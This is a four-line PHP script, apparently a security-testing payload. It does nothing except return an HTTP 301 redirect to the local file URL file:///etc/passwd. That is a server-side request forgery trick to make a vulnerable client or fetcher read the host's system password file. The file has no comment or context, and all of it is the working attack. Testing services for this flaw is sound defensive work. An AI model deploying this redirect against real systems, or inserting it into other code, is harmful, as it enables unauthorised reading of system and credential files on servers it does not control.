<?php
http_response_code(301);
header("Location: file:///etc/passwd");
die();